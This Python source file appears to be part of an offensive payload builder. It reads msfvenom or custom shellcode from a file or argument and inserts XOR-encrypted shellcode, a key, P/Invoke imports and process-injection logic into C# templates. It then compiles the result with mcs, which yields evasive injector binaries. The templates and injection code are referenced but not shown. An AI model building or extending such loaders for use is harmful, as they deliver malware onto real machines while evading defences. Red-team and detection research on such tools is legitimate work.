import subprocess
from lib.init import *
from lib.args import *

script_path = os.path.dirname(os.path.abspath(__file__))

# generate msfvenom, custom hex, or shellcode file content
def load_shellcode_from_file(path):
    with open(path, "rb") as handle:
        data = handle.read()

    if not data:
        raise ValueError("shellcode file is empty")

    # Support raw bytes as well as ASCII hex text.
    try:
        text = data.decode("utf-8").strip()
        if text:
            cleaned = "".join(text.split())
            if all(ch in "0123456789abcdefABCDEF" for ch in cleaned):
                return cleaned
    except UnicodeDecodeError:
        pass

    return "".join(f"{b:02x}" for b in data)

# generate msfvenom or custom shellcode
def choose_shellcode(custom):
    if getattr(args, "shellcode_file", None):
        return load_shellcode_from_file(args.shellcode_file)

    if(custom):
         shellcode_hex = args.shellcode
         return shellcode_hex

# create csharp file based on input from template
def generate_cs_file(binary, encrypted, injection_technique):
    with open(f"{script_path}/../cs_templates/{binary}.cs","r") as file:
        template = file.read()
        template = template.replace('{encrypted_shellcode}', encrypted['blob'])
        template = template.replace('{xor_key}', encrypted['key'])
        template = template.replace('{pinvoke_code}', injection_list['injection_techniques'][f'{injection_technique}']['pinvoke_imports'])
        template = template.replace('{injection_logic}', injection_list['injection_techniques'][f'{injection_technique}']['code'])

    with open(os.path.join(os.getcwd(), f"{binary}.cs"), "w") as file:
        file.write(template)

# compile csharp file using mcs
def mcs_compile(command):
    op = subprocess.run(command.split(), capture_output=True)
    if op.returncode != 0:
        print(Fore.RED + Style.BRIGHT + "[!] MCS Execution Error")
        print(Fore.RED + op.stderr.decode())
        exit()
    else:
        return True